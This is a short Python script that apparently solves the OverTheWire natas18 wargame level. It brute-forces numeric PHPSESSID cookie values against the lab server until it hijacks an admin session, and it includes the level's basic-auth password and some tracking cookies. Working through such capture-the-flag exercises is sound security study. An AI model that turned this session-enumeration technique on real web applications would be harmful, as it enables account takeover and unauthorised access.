import requests
from requests.auth import HTTPBasicAuth

uri = 'http://natas18.natas.labs.overthewire.org/index.php?debug'

# Data = {'username' : 'natas19','password' : 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'}
for i in range(1,640):
    r = requests.post(
            uri,
            auth=HTTPBasicAuth('natas18', 'xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP'),
            headers = {'Cookie': '__cfduid=d3939aa57bc3e1df0de30e870aa0fa6b51552234636; __utma=176859643.1837799334.1552234637.1553887875.1554142555.20; __utmz=176859643.1552241337.3.2.utmcsr=google|utmccn=(organic)|utmcmd=organic|utmctr=(not%20provided); PHPSESSID=' + str(i) })
    if 'regular' not in r.text:
        print(r.text)
        print('\n' + str(i))
        break;

